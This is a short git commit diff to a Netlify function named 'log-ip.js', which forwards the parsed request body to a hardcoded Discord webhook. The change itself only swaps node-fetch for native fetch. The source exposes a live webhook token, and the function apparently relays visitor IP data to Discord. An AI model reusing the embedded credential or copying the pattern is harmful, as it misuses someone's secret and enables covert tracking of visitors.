8524b807fdf4c455cff5c576d7db108d6fe3193e
CryptedEx <105995404+CryptedEx@users.noreply.github.com>
2025-08-08 22:01:11 +0100

    Update log-ip.js

--- netlify/functions/log-ip.js
+++ netlify/functions/log-ip.js
@@ -1,10 +1,9 @@
-const fetch = require('node-fetch');
-
 exports.handler = async function(event, context) {
   try {
     const data = JSON.parse(event.body);
     const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
 
+    // Use native fetch (Netlify Node 18+)
     const res = await fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
